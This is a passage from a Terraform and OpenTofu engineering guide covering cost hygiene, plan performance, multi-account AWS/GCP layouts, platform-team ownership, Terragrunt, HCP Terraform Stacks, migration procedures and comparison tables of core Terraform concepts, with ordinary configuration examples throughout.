| x86 instead of Graviton | +20% | ARM64 everywhere you can |
| Cross-AZ data transfer | $0.01/GB each way | Keep chatty services AZ-local |
| Orphaned ECR images | $0.10/GB | Lifecycle policies |
| S3 without lifecycle rules | Unbounded | Transition + expire |

### 63.3 Enforcing cost hygiene in code

```hcl
# Log retention is mandatory
variable "log_retention_days" {
  type = number
  validation {
    condition     = contains([1,3,5,7,14,30,60,90,120,150,180,365,400,545,731,1096,1827,2192,2557,2922,3288,3653], var.log_retention_days)
    error_message = "Must be a valid CloudWatch retention value. Never leave it unset."
  }
}

# ECR lifecycle
resource "aws_ecr_lifecycle_policy" "main" {
  repository = aws_ecr_repository.main.name
  policy = jsonencode({
    rules = [
      {
        rulePriority = 1
        description  = "Keep the last 20 tagged images"
        selection = {
          tagStatus     = "tagged"
          tagPrefixList = ["v", "sha-"]
          countType     = "imageCountMoreThan"
          countNumber   = 20
        }
        action = { type = "expire" }
      },
      {
        rulePriority = 2
        description  = "Expire untagged images after 7 days"
        selection = {
          tagStatus   = "untagged"
          countType   = "sinceImagePushed"
          countUnit   = "days"
          countNumber = 7
        }
        action = { type = "expire" }
      }
    ]
  })
}
```

```rego
# policies/cost.rego
deny contains msg if {
  r := input.resource_changes[_]
  r.type == "aws_cloudwatch_log_group"
  "create" in r.change.actions
  not r.change.after.retention_in_days
  msg := sprintf("%s: retention_in_days is required — unbounded log retention is a cost leak", [r.address])
}

warn contains msg if {
  r := input.resource_changes[_]
  r.type == "aws_nat_gateway"
  "create" in r.change.actions
  msg := sprintf("%s: a NAT gateway costs ~$32/month plus data processing. Confirm it is needed.", [r.address])
}
```

### 63.4 Non-production scheduling

```hcl
resource "aws_scheduler_schedule" "stop_dev_rds" {
  count = var.environment == "dev" ? 1 : 0

  name                = "${local.name_prefix}-stop-rds"
  schedule_expression = "cron(0 14 ? * MON-FRI *)"   # 19:30 IST
  flexible_time_window { mode = "OFF" }

  target {
    arn      = "arn:aws:scheduler:::aws-sdk:rds:stopDBInstance"
    role_arn = aws_iam_role.scheduler.arn
    input    = jsonencode({ DbInstanceIdentifier = aws_db_instance.main.identifier })
  }
}
```

💰 Stopping non-production databases outside working hours cuts their cost by roughly 65%.

---

## Chapter 64 — Performance at Scale

### 64.1 Why plans get slow

The refresh phase makes one API call per resource. A 2,000-resource stack makes 2,000 calls, subject to provider rate limits.

| Technique | Effect | Trade-off |
|---|---|---|
| **Split the state** (Chapter 8) | The only real fix | Cross-stack plumbing |
| `-parallelism=20` | More concurrent operations | ⚠️ Provider rate limits, throttling |
| `-refresh=false` | Skips refresh entirely | ⚠️ Misses drift |
| `-target=...` | Plans a subset | ⚠️ Dangerous — see below |
| Provider caching in CI | Faster init | None |
| Fewer data sources | Each one is an API call | Less dynamic config |

### 64.2 ⚠️ Why `-target` is dangerous

```bash
terraform apply -target=aws_instance.web   # ⚠️
```

Problems:
- The resulting state does not reflect the full configuration. Outputs may be stale.
- Dependencies outside the target are not updated, so you can create an inconsistent system.
- It hides the real problem, which is almost always that your state is too large or your config has a bug.
- Terraform itself prints a warning telling you this is for exceptional recovery only.

**Legitimate uses:** recovering from a partial apply, working around a provider bug, breaking a dependency cycle during a refactor. **Always follow with an untargeted apply** to reconcile.

### 64.3 Provider caching in CI

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.terraform.d/plugin-cache
    key: tf-plugins-${{ runner.os }}-${{ hashFiles('**/.terraform.lock.hcl') }}
    restore-keys: tf-plugins-${{ runner.os }}-

- run: |
    mkdir -p ~/.terraform.d/plugin-cache
    echo 'plugin_cache_dir = "$HOME/.terraform.d/plugin-cache"' > ~/.terraformrc
```

Saves 20–60 seconds per job. On a 15-stack matrix that is meaningful.

### 64.4 When a state file is too big

Rules of thumb:

| Resources in one state | Verdict |
|---|---|
| < 200 | Fine |
| 200–500 | Watch the plan time |
| 500–1,000 | ⚠️ Split it soon |
| > 1,000 | 🔴 Split it now |

Symptoms: plans over five minutes, frequent lock contention, engineers avoiding changes because "the apply takes forever", a single mistake having a huge blast radius.

---
# Part XI — Organisation Scale

---

## Chapter 65 — Multi-Account and Multi-Project Architecture

### 65.1 Why accounts and projects are the real blast-radius boundary

Everything else in this guide — separate state, separate IAM roles, environment gates — is a control *inside* one cloud account. The account itself is the only boundary the cloud provider enforces absolutely.

```mermaid
flowchart TD
    subgraph SINGLE["Single account, environments by tag/name"]
        S1["One account"] --> S2["⚠️ A wildcard IAM policy reaches production<br/>⚠️ A service quota is shared — dev exhausts it<br/>⚠️ Cost allocation relies on tag discipline<br/>⚠️ One compromised credential reaches everything"]
    end
    subgraph MULTI["Account per environment"]
        M1["acme-dev<br/>acme-staging<br/>acme-production<br/>acme-shared-services<br/>acme-security"] --> M2["✅ IAM cannot cross accounts without an explicit role<br/>✅ Quotas are per account<br/>✅ Cost is per account, no tagging needed<br/>✅ SCPs apply per OU"]
    end
```

**Recommendation: one AWS account per environment, minimum.** This is the single highest-value structural decision in cloud architecture, and it is much cheaper to do at the start than to retrofit.

### 65.2 A reference AWS Organizations layout

```
Root
├── Security OU
│   ├── acme-log-archive       (CloudTrail, Config, VPC flow logs — write-only from others)
│   └── acme-security-tooling  (GuardDuty admin, Security Hub, Detective)
├── Infrastructure OU
│   ├── acme-shared-services   (ECR, shared Route53 zones, the Terraform state bucket)
│   └── acme-network           (Transit Gateway, if you need one)
├── Workloads OU
│   ├── Non-production OU
│   │   ├── acme-dev
│   │   └── acme-staging
│   └── Production OU
│       └── acme-production
└── Sandbox OU
    └── acme-sandbox-*         (per-engineer, budget-capped, aggressive SCPs)
```

SCPs attach at the OU level (Chapter 44.2). The Production OU gets the strictest set; the Sandbox OU gets a cost-focused set that denies expensive instance families.

### 65.3 Where Terraform state lives in a multi-account world

Two workable models:

**Model A — state in a shared-services account (recommended).**

```hcl
# Every stack, regardless of which account it manages
terraform {
  backend "s3" {
    bucket       = "acme-tfstate-999999999999"   # shared-services account
    key          = "apps/api/production/terraform.tfstate"
    region       = "ap-south-1"
    use_lockfile = true
    role_arn     = "arn:aws:iam::999999999999:role/tfstate-access"
  }
}

provider "aws" {
  region              = "ap-south-1"
  allowed_account_ids = ["111111111111"]        # the production account

  assume_role {
    role_arn = "arn:aws:iam::111111111111:role/terraform-apply"
  }
}
```

🧠 **Note the two different role assumptions.** The backend assumes a role in shared-services to read/write state; the provider assumes a role in the target account to manage resources. These are separate, and that separation is useful — it means the production apply role does not need any access to other environments' state.

**Model B — state in the account it manages.** Simpler to reason about, more buckets to bootstrap, and cross-account reads become awkward. Acceptable for small setups.

### 65.4 Bootstrapping accounts with Terraform

```hcl
# stacks/organization/main.tf
resource "aws_organizations_organization" "main" {
  aws_service_access_principals = [
    "cloudtrail.amazonaws.com",
    "config.amazonaws.com",
    "guardduty.amazonaws.com",
    "sso.amazonaws.com",
  ]
  feature_set = "ALL"

  lifecycle { prevent_destroy = true }
}

resource "aws_organizations_organizational_unit" "workloads" {
  name      = "Workloads"
  parent_id = aws_organizations_organization.main.roots[0].id
}

resource "aws_organizations_organizational_unit" "production" {
  name      = "Production"
  parent_id = aws_organizations_organizational_unit.workloads.id
}

resource "aws_organizations_account" "production" {
  name      = "acme-production"
  email     = "aws-production@acme.com"
  parent_id = aws_organizations_organizational_unit.production.id

  # The role Terraform will assume into the new account
  role_name = "OrganizationAccountAccessRole"

  # ⚠️ Removing this resource from Terraform does NOT close the account;
  # it only removes it from the organization. Closing is a separate, slow process.
  close_on_deletion = false

  lifecycle {
    prevent_destroy = true
    ignore_changes  = [role_name]
  }
}

resource "aws_organizations_policy" "production_guardrails" {
  name    = "production-guardrails"
  type    = "SERVICE_CONTROL_POLICY"
  content = data.aws_iam_policy_document.production_scp.json
}

resource "aws_organizations_policy_attachment" "production" {
  policy_id = aws_organizations_policy.production_guardrails.id
  target_id = aws_organizations_organizational_unit.production.id
}
```

⚠️ **Account creation is slow and only partially reversible.** Create the account, then bootstrap it in a separate apply. Do not put account creation and account contents in the same stack — the provider for the new account cannot be configured until the account exists, which is the same chicken-and-egg problem as Chapter 38.

### 65.5 Control Tower

**Official behaviour:** AWS Control Tower automates the landing zone — organisational units, guardrails, account factory, centralised logging. It is largely **not** Terraform-managed; you configure it in the console or via Account Factory for Terraform (AFT).

**Recommendation:** if you are starting fresh with more than a handful of accounts, use Control Tower for the landing zone and Terraform for everything inside each account. Fighting Control Tower with raw `aws_organizations_*` resources is possible but rarely worth it.

⚠️ If Control Tower manages your OUs and SCPs, do **not** also manage them in Terraform. You will get a permanent drift fight.

### 65.6 GCP: projects are lighter

```hcl
resource "google_project" "environment" {
  for_each = toset(["dev", "staging", "production"])

  name            = "acme-${each.key}"
  project_id      = "acme-${each.key}-${random_id.suffix[each.key].hex}"
  folder_id       = google_folder.workloads.id
  billing_account = var.billing_account

  # ⚠️ Terraform will not delete a project with this set
  deletion_policy = "PREVENT"

  labels = { environment = each.key }
}

resource "google_project_service" "apis" {
  for_each = {
    for pair in setproduct(
      ["dev", "staging", "production"],
      ["compute.googleapis.com", "container.googleapis.com", "sqladmin.googleapis.com",
       "secretmanager.googleapis.com", "run.googleapis.com", "artifactregistry.googleapis.com"]
    ) : "${pair[0]}-${pair[1]}" => { project = pair[0], api = pair[1] }
  }

  project = google_project.environment[each.value.project].project_id
  service = each.value.api

  disable_on_destroy = false     # ⚠️ disabling an API can break other resources
}
```

🧠 **The structural difference from AWS:** a GCP project is created by an API call in seconds, so GCP architectures typically use **far more projects** — often one per service per environment. A GCP org with 200 projects is normal; an AWS org with 200 accounts is a large enterprise.

This makes the "project per stack" pattern practical on GCP in a way "account per stack" never is on AWS.

---

## Chapter 66 — The Platform Team Model

### 66.1 The three-layer ownership model

```mermaid
flowchart TD
    subgraph PLAT["Platform team owns"]
        P1["modules/ — versioned, tested, documented"]
        P2["stacks/foundation/ — VPC, cluster, IAM baseline"]
        P3["policies/ — the rules everyone must pass"]
        P4[".github/workflows/ — the pipeline"]
        P5["Golden paths — 'here is how you ship a service'"]
    end
    subgraph APP["Application teams own"]
        A1["stacks/apps/<their-service>/ — thin module calls"]
        A2["Their service's variables and sizing"]
        A3["Their alarms and dashboards"]
    end
    subgraph SHARED["Shared, with review"]
        S1["stacks/data/ — platform + the owning team"]
        S2["Cross-cutting network changes"]
    end
    PLAT --> APP
    PLAT --> SHARED
```

### 66.2 The golden path

A golden path is a documented, supported, boring way to do the common thing. Onboarding a new service should look like this:

```bash
# 1. Copy the template
cp -r stacks/apps/_template stacks/apps/payments

# 2. Edit three files
#    - terraform.tf   → set the backend key
#    - main.tf        → set the service name and sizing
#    - terraform.tfvars

# 3. Open a PR. The pipeline does the rest.
```

```hcl
# stacks/apps/_template/production/main.tf
module "service" {
  source = "git::ssh://git@github.com/acme/terraform-modules.git//ecs-service?ref=v3.2.0"

  name        = "CHANGE_ME"
  environment = "production"

  cluster_arn = data.aws_ssm_parameter.cluster_arn.value
  vpc_id      = data.aws_ssm_parameter.vpc_id.value
  subnet_ids  = split(",", data.aws_ssm_parameter.private_subnet_ids.value)

  listener_arn       = data.aws_ssm_parameter.listener_arn.value
  listener_priority  = 100   # ⚠️ must be unique — see docs/listener-priorities.md
  hostname           = "CHANGE_ME.acme.com"

  image = var.image

  cpu           = 1024
  memory        = 2048
  desired_count = 3

  autoscaling = {
    min_capacity = 3
    max_capacity = 20
  }

  alarm_topic_arn = data.aws_ssm_parameter.alarm_topic_arn.value
}
```

🧠 **The measure of a good platform is how much a team has to understand to ship safely.** If onboarding a service requires understanding VPCs, IAM trust policies and ALB listener rules, the platform has failed. If it requires filling in a name and a size, it has succeeded.

### 66.3 Governance without becoming a bottleneck

| Mechanism | What it enforces | Bottleneck risk |
|---|---|---|
| CODEOWNERS on `modules/`, `policies/`, `.github/` | Platform reviews changes to the platform | Low — these change rarely |
| CODEOWNERS on `stacks/apps/*/production/` | A second pair of eyes on production | Medium — keep review SLAs |
| Policy as code | The rules, automatically | ✅ None — it is self-service |
| Permission boundaries | Ceiling on what app teams' roles can do | ✅ None |
| Module defaults | Safe by default | ✅ None |
| Manual platform approval for every change | Everything | 🔴 High — avoid |

**Recommendation:** enforce through **policy and module defaults**, not through review queues. A reviewer who must check that encryption is enabled on every PR is doing a job a policy should do.

### 66.4 Private module registry

Covered in Chapter 25.3. At organisation scale, add:

- A `CODEOWNERS` on the modules repo so platform reviews all changes.
- Automated release notes (Chapter 51).
- A **deprecation process**: mark a module version deprecated, open issues on every consumer repo, set a removal date.
- A dashboard of which version each stack uses. `grep -r 'ref=v' stacks/ | sort | uniq -c` gets you surprisingly far.

### 66.5 RBAC across the pipeline

| Actor | Repo access | AWS access |
|---|---|---|
| App engineer | Write to `stacks/apps/<theirs>/` | None directly |
| Platform engineer | Write everywhere | None directly |
| CI plan job | Read | `terraform-plan` (read-only + state) |
| CI apply job (dev) | Read | `terraform-apply-dev` |
| CI apply job (production) | Read | `terraform-apply-production`, gated by environment |
| Break-glass | — | A separate role, MFA-only, alerting on every use |

🧠 **No human should hold standing apply credentials.** The break-glass role exists, is alarmed, and is used perhaps twice a year.

---

## Chapter 67 — Terragrunt

### 67.1 What it actually solves

Terragrunt (now at **1.1.6**, having reached 1.0 in 2025) is a thin wrapper around Terraform/OpenTofu. Its value proposition is eliminating three specific kinds of repetition:

```hcl
# live/terragrunt.hcl — the root configuration
remote_state {
  backend = "s3"
  generate = {
    path      = "backend.tf"
    if_exists = "overwrite_terragrunt"
  }
  config = {
    bucket       = "acme-tfstate-${local.account_id}"
    key          = "${path_relative_to_include()}/terraform.tfstate"
    region       = "ap-south-1"
    encrypt      = true
    use_lockfile = true
  }
}

generate "provider" {
  path      = "provider.tf"
  if_exists = "overwrite_terragrunt"
  contents  = <<EOF
provider "aws" {
  region              = "${local.region}"
  allowed_account_ids = ["${local.account_id}"]
  default_tags {
    tags = ${jsonencode(local.common_tags)}
  }
}
EOF
}
```

```hcl
# live/production/apps/api/terragrunt.hcl
include "root" {
  path = find_in_parent_folders()
}

terraform {
  source = "git::ssh://git@github.com/acme/terraform-modules.git//ecs-service?ref=v3.2.0"
}

dependency "foundation" {
  config_path = "../../foundation"

  # Values used when the dependency has not been applied yet, e.g. during a plan-all
  mock_outputs = {
    vpc_id             = "vpc-mock"
    private_subnet_ids = ["subnet-mock1", "subnet-mock2"]
    ecs_cluster_arn    = "arn:aws:ecs:ap-south-1:000000000000:cluster/mock"
  }
  mock_outputs_allowed_terraform_commands = ["plan", "validate"]
}

inputs = {
  name        = "api"
  environment = "production"
  vpc_id      = dependency.foundation.outputs.vpc_id
  subnet_ids  = dependency.foundation.outputs.private_subnet_ids
  cluster_arn = dependency.foundation.outputs.ecs_cluster_arn

  cpu           = 2048
  memory        = 4096
  desired_count = 6
}
```

```bash
terragrunt run --all plan        # plan every unit, in dependency order
terragrunt run --all apply
terragrunt run --all apply --queue-include-dir production/apps/**
```

### 67.2 What you get, and what you pay

| Terragrunt gives you | Cost |
|---|---|
| Generated backend config — no duplication | An extra tool, an extra DSL |
| Generated provider config | Generated files are not in git; debugging is indirect |
| A real dependency graph across stacks | `mock_outputs` is a genuine footgun — a wrong mock hides a real error |
| `run --all` across many units | Errors in one unit can be hard to locate in the combined output |
| `before_hook` / `after_hook` | More places for behaviour to hide |
| DRY inputs via `include` and `read_terragrunt_config` | Another layer of indirection to trace |

### 67.3 Does a small team need it?

**Recommendation: no, under about 15 stacks.**

The honest arithmetic: Terragrunt's main win is eliminating perhaps 15 lines of backend and provider boilerplate per stack. With 10 stacks that is 150 lines of duplication — annoying but harmless, and entirely greppable. With 100 stacks across 5 accounts and 3 regions, it is 1,500 lines of hand-maintained boilerplate and an eventual mistake.

⚠️ The costs are not just the tool. Every engineer must learn a second DSL. Every error message goes through a wrapper. Every Terraform feature arrives in Terragrunt some time later. `mock_outputs` will, at some point, let a broken plan look fine.

**Adopt Terragrunt when:**
- You have more than ~15 stacks, or more than 3 accounts × 3 regions.
- Cross-stack dependency ordering is genuinely painful in your pipeline.
- You are already duplicating backend configuration and it has caused a real incident.

**Do not adopt it because:**
- It is what a blog post recommended.
- You want DRY for its own sake.
- Someone on the team used it before.

🔬 **Note:** Terragrunt 1.0 renamed many commands (`run-all` → `run --all`, `terragrunt-*` flags restructured). Older tutorials use the pre-1.0 syntax, which will not work.

---

## Chapter 68 — Stacks and Orchestration

### 68.1 What Stacks are

🔬 **Terraform Stacks reached GA in 2026, and are available only on HCP Terraform and Terraform Enterprise.** There is no open-source or CLI-only Stacks. This single fact determines whether they are relevant to you.

Stacks introduce two new file types:

```hcl
# components.tfstack.hcl — what the stack is made of
component "foundation" {
  source = "./modules/foundation"

  inputs = {
    environment = var.environment
    vpc_cidr    = var.vpc_cidr
  }

  providers = {
    aws = provider.aws.this
  }
}

component "api" {
  source = "./modules/ecs-service"

  inputs = {
    name        = "api"
    environment = var.environment
    vpc_id      = component.foundation.vpc_id        # dependency, resolved natively
    subnet_ids  = component.foundation.private_subnet_ids
  }

  providers = {
    aws = provider.aws.this
  }
}
```

```hcl
# deployments.tfdeploy.hcl — where it gets deployed
deployment "dev" {
  inputs = {
    environment    = "dev"
    aws_account_id = "111111111111"
    vpc_cidr       = "10.10.0.0/16"
  }
}

deployment "production" {
  inputs = {
    environment    = "production"
    aws_account_id = "333333333333"
    vpc_cidr       = "10.30.0.0/16"
  }
}

# Auto-approve dev, require approval for production
orchestrate "auto_approve" "dev_no_deletes" {
  check {
    condition = context.plan.deployment.deployment.dev != null && context.plan.changes.remove == 0
    reason    = "Auto-approving dev plans with no deletions"
  }
}
```

### 68.2 What problem they solve

Stacks address the three things that are genuinely awkward in plain Terraform:

1. **Cross-component dependencies without `terraform_remote_state`** — `component.foundation.vpc_id` just works, with no state access and no SSM plumbing.
2. **Multi-deployment orchestration** — one definition, many deployments, with ordering handled.
3. **Deferred actions** — a component can plan against values that will only be known after an earlier component applies, solving the Kubernetes-provider problem from Chapter 38.

### 68.3 Should you care?

| | Verdict |
|---|---|
| Self-managed Terraform/OpenTofu user | ❌ Not available. Nothing to evaluate |
| HCP Terraform user with many similar environments | ✅ Worth serious evaluation |
| HCP user with a handful of stacks | ⚠️ The existing workspace model is probably fine |
| OpenTofu user | ❌ No equivalent. Terragrunt is the closest |

**Recommendation for this guide's reader:** be aware Stacks exist and what they solve, so you recognise the problem when you hit it. The directory-based pattern in Chapter 27 plus SSM contracts in Chapter 28 solves the same problems adequately for a small team, without a subscription.

---

## Chapter 69 — Migrations

### 69.1 ClickOps → Terraform

The realistic path for an existing, hand-built environment:

```mermaid
flowchart TD
    A["Existing manually-built infrastructure"] --> B["1. STOP creating new things by hand.<br/>Everything new goes through Terraform<br/>from today."]
    B --> C["2. Bootstrap state (Chapter 8)"]
    C --> D["3. Import the STABLE, low-risk layer first:<br/>VPC, subnets, security groups"]
    D --> E["4. Import IAM"]
    E --> F["5. Import stateful things:<br/>RDS, S3, ElastiCache<br/>— with prevent_destroy from day one"]
    F --> G["6. Import compute last<br/>(it changes most, and can be recreated)"]
    G --> H["7. Refactor into modules,<br/>using moved blocks"]
    H --> I["8. Tag everything ManagedBy=terraform.<br/>Anything without that tag is<br/>now a to-do item."]
```

🧠 **Step 1 is the one that matters.** A team that keeps creating resources by hand while importing the old ones never finishes. Draw the line on a date.

⚠️ **Do not try to import everything at once.** Import one logical group, get a clean `No changes` plan, merge, then move to the next. A three-month gradual import that ships every week beats a six-week big-bang that never lands.

**Finding what is unmanaged:**

```bash
aws resourcegroupstaggingapi get-resources \
  --query 'ResourceTagMappingList[?!(Tags[?Key==`ManagedBy`])].ResourceARN' \
  --output text | tr '\t' '\n' | sort
```

### 69.2 Terraform → OpenTofu

**The migration itself is straightforward.** Both read the same HCL and the same state format.

```bash
# 1. Pin your current Terraform version and take a state backup
terraform state pull > backup-$(date +%Y%m%d).tfstate

# 2. Install OpenTofu
tenv tofu install 1.12.6
tenv tofu use 1.12.6

# 3. Initialise — OpenTofu reads the existing state and lock file
tofu init

# 4. THE ACCEPTANCE TEST
tofu plan       # must show: No changes
```

⚠️ **If the plan is not empty, stop and investigate.** The most common cause is provider source addresses. OpenTofu defaults to its own registry, and while it proxies `hashicorp/*` providers, you may need:

```bash
terraform state replace-provider \
  registry.terraform.io/hashicorp/aws \
  registry.opentofu.org/hashicorp/aws
```

**The one-way features.** Once you use these, you cannot go back to Terraform:

| OpenTofu-only feature | Version | Reversible? |
|---|---|---|
| State encryption | 1.7+ | ❌ Terraform cannot read encrypted state |
| `for_each` on provider blocks | 1.9+ | ❌ Terraform has no equivalent syntax |
| `lifecycle { enabled }` | 1.11+ | ❌ |
| `prevent_destroy` on variables | 1.12+ | ❌ |
| `.tofu` file extension | 1.8+ | ❌ Terraform ignores these files |

**Recommendation:** migrate, run for a month using only shared features, then decide whether the OpenTofu-only features (especially state encryption) are worth the one-way door.

### 69.3 OpenTofu → Terraform

The reverse works only if you have used no OpenTofu-only features.

```bash
tofu state pull > state.json
# Check for anything OpenTofu-specific
jq '.terraform_version' state.json
terraform init
terraform plan
```

⚠️ State written by OpenTofu records `"terraform_version": "1.12.6"`, which Terraform may object to. `terraform state push` with a corrected version field is the workaround, and it is exactly the kind of state surgery this guide tells you to avoid — another reason to make the choice deliberately rather than casually.

### 69.4 Monolith state → split stacks

Chapter 22. The operational advice: do it **one stack at a time**, on a quiet week, with a rollback plan (the state backup), and verify with `No changes` in both directions before merging.

### 69.5 Workspaces → directories

A common migration once a team outgrows workspaces:

```bash
# For each workspace
terraform workspace select production
terraform state pull > /tmp/production.tfstate

# Create the new directory structure, with a per-environment backend
mkdir -p stacks/apps/api/production
# ... write terraform.tf with the new backend key, main.tf, terraform.tfvars

cd stacks/apps/api/production
terraform init
terraform state push /tmp/production.tfstate

terraform plan    # must show: No changes

# Once all environments are migrated
cd ../../../old-location
terraform workspace delete production
```

⚠️ The `No changes` check is doing all the work here. If the new directory's configuration differs from what the workspace's conditionals produced, you will see it as a diff — catch it there, not in production.

---
# Part XII — Engineering Practice

---

## Chapter 70 — Important Distinctions

Confusing any of these pairs causes real production incidents. Each table is worth reading slowly.

### 70.1 Plan vs apply

| | `terraform plan` | `terraform apply` |
|---|---|---|
| Changes infrastructure | ❌ No | ✅ Yes |
| Changes state | ⚠️ **Yes, if refresh finds drift** | ✅ Yes |
| Needs write credentials | ⚠️ Write to **state**, read on resources | ✅ Yes |
| Takes the state lock | ✅ Yes | ✅ Yes |
| Output | A proposed set of actions | The result of performing them |
| Safe to run on a PR from a fork | ⚠️ Only with a read-only role and no `external`/`local-exec` | ❌ **Never** |
| Can be saved | `-out=tfplan` | Consumes a saved plan |

🧠 **"Plan is read-only" is the most common half-truth in Terraform.** Refresh writes drift back into state. That is why the plan role needs `s3:PutObject` on the state key.

### 70.2 State vs configuration vs real infrastructure

| | Configuration (`.tf`) | State (`.tfstate`) | Real infrastructure |
|---|---|---|---|
| What it is | What you **want** | What Terraform **last recorded** | What **actually exists** |
| Source of truth for | Intent | The mapping from address to real ID | Reality |
| Lives in | Git | S3/GCS backend | The cloud |
| Changed by | You, in a PR | Terraform, on plan/apply | Terraform, or anyone with console access |
| If it disagrees with reality | That is a **plan** | That is **drift** | — |

```mermaid
flowchart LR
    C["Configuration<br/>desired"] -->|"diff"| P["PLAN"]
    S["State<br/>recorded"] -->|"diff"| P
    R["Reality<br/>actual"] -->|"refresh"| S
    P -->|"apply"| R
    P -->|"apply"| S
```

**The three gaps and their names:**

| Gap | Name | Fixed by |
|---|---|---|
| Config ≠ State | A pending change | `terraform apply` |
| State ≠ Reality | **Drift** | `terraform apply -refresh-only`, or apply to revert |
| Config ≠ Reality, State says otherwise | Corrupted or stale state | Investigation, then import or state surgery |

### 70.3 Module vs resource

| | Resource | Module |
|---|---|---|
| What it is | One object in a provider's API | A group of resources and other modules |
| Address | `aws_instance.web` | `module.api` |
| Nested address | — | `module.api.aws_instance.web` |
| Has its own state | ❌ No, it is an entry in state | ❌ No — the root module's state holds everything |
| Has a provider | ✅ Directly | ⚠️ Inherits, or receives via `providers = {}` |
| Supports `count`/`for_each` | ✅ | ✅ |
| Supports `lifecycle` | ✅ | ❌ **No** — a very common surprise |
| Supports `depends_on` | ✅ | ✅ (but see Chapter 14.6) |

⚠️ **`lifecycle` on a `module` block is not valid.** You cannot write `module "db" { lifecycle { prevent_destroy = true } }`. The lifecycle must go on the resource inside the module — which means the module author has to expose it or hardcode it.

### 70.4 Root module vs child module

| | Root module | Child module |
|---|---|---|
| Where you run `terraform` | ✅ Here | ❌ Never directly |
| Has a `backend` block | ✅ Yes | ❌ **Never** |
| Has `provider` blocks | ✅ Yes | ❌ **Never** (declares `configuration_aliases` instead) |
| Has state | ✅ Its own state file | ❌ Recorded inside the root's state |
| Provider version constraint style | Tight: `~> 6.66` | Loose: `>= 6.0` |
| Variables come from | tfvars, CLI, environment | The calling `module` block |
| Is | Your environment/stack directory | A reusable component |

### 70.5 Variable vs local vs output

Full table in Chapter 11.5. The one-line version:

- **`variable`** — an input someone else sets.
- **`local`** — a named computation, internal to this module.
- **`output`** — a value this module returns.

### 70.6 Data source vs resource

| | Resource | Data source |
|---|---|---|
| Keyword | `resource` | `data` |
| Reference | `aws_vpc.main.id` | `data.aws_vpc.main.id` |
| Terraform creates it | ✅ | ❌ |
| `terraform destroy` removes it | ✅ | ❌ |
| Appears in the plan as | `+ create` | `<= read` (only if unknown at plan time) |
| Can be imported | ✅ | N/A — it is already a read |
| Fails if it does not exist | On create | ⚠️ At plan time, often confusingly |

### 70.7 Import vs data source

Both bring existing infrastructure into your configuration. They are not interchangeable.

| | `import` block | Data source |
|---|---|---|
| Question it answers | "Terraform should now **own** this" | "Terraform should **read** this" |
| After it runs | The object is in state, managed | Nothing is in state but a cached read |
| `terraform destroy` | ⚠️ **Will destroy the object** | Does nothing |
| Requires a matching `resource` block | ✅ Yes | ❌ No |
| Used for | Adopting hand-built infrastructure | Referencing things another team owns |
| One-off or permanent | One-off; delete the block afterwards | Permanent |

🧠 **The test: who should own this object's lifecycle?** If the answer is "this stack", import it. If it is "someone else", use a data source.

### 70.8 Workspace vs environment

| | Terraform workspace | Environment (dev/staging/prod) |
|---|---|---|
| What it is | A named state file within one backend + configuration | An organisational and operational concept |
| Created by | `terraform workspace new` | Your directory structure and account layout |
| Configuration | ⚠️ **Identical** across workspaces | Can differ freely |
| Provider versions | ⚠️ Identical | Can differ — enables staged upgrades |
| Credentials | ⚠️ Same for all | Different accounts, different roles |
| Good for | Ephemeral, structurally identical copies | Long-lived, diverging deployments |

⚠️ **Using workspaces as environments is the single most common structural mistake** in Terraform codebases. Chapter 27.3 explains why in detail.

### 70.9 `taint` vs `-replace`

| | `terraform taint` | `terraform apply -replace=ADDR` |
|---|---|---|
| Status | **Deprecated** | Current |
| When it acts | Immediately mutates state | At plan time |
| Visible in a plan first | ❌ No | ✅ Yes |
| Reviewable | ❌ | ✅ |
| Reversible before applying | `terraform untaint` | Just do not apply |

### 70.10 Desired vs actual vs recorded state

Three different things people all call "state":

| Term | Means | Lives in |
|---|---|---|
| **Desired state** | What your configuration says | `.tf` files, in git |
| **Recorded state** | What Terraform last saw | `terraform.tfstate` |
| **Actual state** | What exists right now | The cloud provider |

### 70.11 Terraform vs Ansible

| | Terraform | Ansible |
|---|---|---|
| Model | Declarative, with state | Procedural-ish, stateless |
| Tracks what it created | ✅ Yes | ❌ No |
| Knows what to delete | ✅ Yes | ❌ No — you must write the removal |
| Primary job | **Provisioning** infrastructure | **Configuring** machines |
| Idempotency | From state comparison | From each module's own logic |
| Agent required | No | No (SSH) |
| Good at | Cloud resources, networks, IAM | Package installation, file templating, service management |
| Bad at | In-VM configuration | Knowing that a VM should no longer exist |

**Recommendation:** with containers you rarely need Ansible at all. If you run VMs, use Terraform to create them and Packer to bake the image; use Ansible only if you genuinely must configure long-lived mutable servers.

### 70.12 Terraform vs Kubernetes manifests and Helm

| | Terraform | Kubernetes manifests / Helm / ArgoCD |
|---|---|---|
| Reconciliation | ⚠️ Only when you run it | ✅ Continuous, by controllers |
| Drift correction | Manual, or a scheduled plan | ✅ Automatic self-healing |
| Scope | Cloud infrastructure | In-cluster objects |
| Deploy frequency it suits | Quarterly to weekly | Many times a day |
| Rollback | Revert the code and apply | `kubectl rollout undo`, Argo rollback |
| Understands rollout health | ⚠️ Poorly | ✅ Natively |

🧠 **The boundary: Terraform builds the cluster; GitOps runs what is in it.** Chapter 38.4.

### 70.13 Provider vs provisioner

Two words that look similar and mean opposite things.

| | Provider | Provisioner |
|---|---|---|
| What | A plugin implementing a set of resource types | A script run during create or destroy |
| Declarative | ✅ | ❌ |
| In the plan | ✅ Fully | ❌ Invisible |
| Tracked in state | ✅ | ❌ |
| Recommended | ✅ Always | ⚠️ Last resort (Chapter 15) |

### 70.14 `count` vs `for_each`

Chapter 13. The summary: `for_each` for named sets, `count` for zero-or-one, never `count` over a list of meaningful things.

### 70.15 `prevent_destroy` vs `deletion_protection`

| | `lifecycle { prevent_destroy = true }` | `deletion_protection = true` |
|---|---|---|
| Enforced by | **Terraform**, at plan time | **The cloud provider**, at API time |
| Bypassed by | Editing the code | Setting it to false and applying |
| Protects against | A Terraform plan that would destroy | **Any** deletion, including the console |
| Value can be a variable | ❌ (🔬 OpenTofu 1.12+ can) | ✅ |
| Protects against `state rm` + manual delete | ❌ | ✅ |

**Recommendation:** use both. They fail in different ways.

---

## Chapter 71 — Anti-Patterns

Each entry: what it is, why it is bad, what to do instead.

### 71.1 Configuration anti-patterns

**Hardcoded account IDs, ARNs and AMIs**
- *Why bad:* breaks on the second environment; AMIs go stale and unsupported.
- *Instead:* `data.aws_caller_identity.current.account_id`, variables, `data.aws_ami` with `owners`.

**`count` over a list of named things**
- *Why bad:* index shifting destroys and recreates unrelated resources (Chapter 13.2).
